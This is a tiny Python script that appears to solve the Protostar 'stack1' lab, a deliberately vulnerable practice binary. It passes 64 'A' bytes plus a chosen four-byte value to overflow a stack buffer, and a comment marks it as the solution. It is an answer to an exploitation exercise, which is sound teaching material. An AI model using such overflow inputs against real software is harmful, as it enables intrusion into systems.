import subprocess

path = '/opt/protostar/bin/stack1'

p = subprocess.call([path, 'A'*64 + '\x64\x63\x62\x61'])  #this is the solution
